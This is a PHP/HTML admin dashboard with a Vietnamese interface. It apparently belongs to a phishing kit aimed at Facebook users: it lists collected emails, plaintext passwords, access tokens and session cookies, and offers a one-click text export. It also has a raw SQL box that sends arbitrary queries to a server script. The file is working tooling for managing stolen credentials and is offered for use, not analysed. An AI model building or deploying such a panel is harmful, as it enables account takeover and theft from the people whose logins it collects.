<!DOCTYPE html>
<html lang="vi">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>Quản trị</title>

		<!-- Bootstrap CSS -->
		<link rel="stylesheet" type="text/css" href="assets/css/bootstrap.min.css">
		<link rel="stylesheet" type="text/css" href="assets/css/flat.css">
		<link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.19/css/jquery.dataTables.min.css">
		<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
		<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
		<!--[if lt IE 9]>
			<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.2/html5shiv.min.js"></script>
			<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
		<![endif]-->
	</head>
	<style type="text/css">
		body{
			background-image: url(http://goodweb.ro/fb/assets/site/images/banner.png);
			background-size: cover;
		}
	</style>
	<body class="container">
		<div style="padding-top: 5%"></div>

		<center>
			<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
			<div class="panel panel-default">
				<div class="panel-heading">
					<h2 class="panel-title">Tài khoản trên hệ thống</h2>
				</div>
				<div class="panel-body">
					<div class="btn-group">
						<a type="button" class="btn btn-info" href="?export=txt">Xuất txt</a>
						<a type="button" class="btn btn-danger" href="logout.php">Đăng xuất</a>
						<button style="display: none;" type="button" class="btn btn-danger">Xóa tất cả</button>
						
					</div>
					<div class="table-responsive">
						<table class="table table-hover">
							<thead>
								<tr>
									<th>Email</th>
									<th>Password</th>
									<th>Access Token</th>
									<th>Cookie</th>
									<th>Thời gian </th>
								</tr>
							</thead>
							<tbody>
								<?php

								$data = $db->get('account');

								foreach ($data as $acc) {
								?>
									<tr>
										<td><?=$acc['email']?></td>
										<td><?=$acc['password']?></td>
										<td><textarea><?=$acc['access_token']?></textarea></td>
										<td><textarea><?=$acc['cookie']?></textarea></td>
										<td><?=date(' H:i - d/m/Y', $acc['time_creat'])?></td>

									</tr>
								<?php
								}
								?>

							</tbody>
						</table>
					</div>
				</div>
			</div>
		</div>

		<div class="panel panel-primary">
			<div class="panel-heading">
				<h3 class="panel-title">QUERY </h3>
			</div>
			<div class="panel-body">
	   <form id="query">
	   		<input type="text" id="query_input" class="form-control" placeholder="DELETE * FROM">
	   </form>

	   <textarea class="form-control" disabled="" id="result" rows="10">
	   		
	   </textarea>
			</div>
		</div>
	   </center>


		<!-- jQuery -->
		<script src="assets/js/jquery.js"></script>
		<script src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
		<!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
 		<script type="text/javascript">
$(document).ready( function () {
    $('table').DataTable({
    	"language": {
		            "search": "Tìm Kiếm",
		            "paginate": {
		                "first": "Về Đầu",
		                "last": "Về Cuối",
		                "next": "Tiến",
		                "previous": "Lùi"
		            },
		            "info": "Hiển thị _START_ đến _END_ của _TOTAL_ mục",
		            "infoEmpty": "Hiển thị 0 đến 0 của 0 mục",
		            "lengthMenu": "Hiển thị _MENU_ mục",
		            "loadingRecords": "Đang tải...",
		            "emptyTable": "Không có gì để hiển thị",
		        }
    });

} );
$('#query').submit(function(e) {
	var query = $('#query_input').val();
	$.get('api/query.php', {query: query}).done(function(a){
		$('#result').val(a);
	});
	e.preventDefault();

});
 		</script>
	</body>
</html>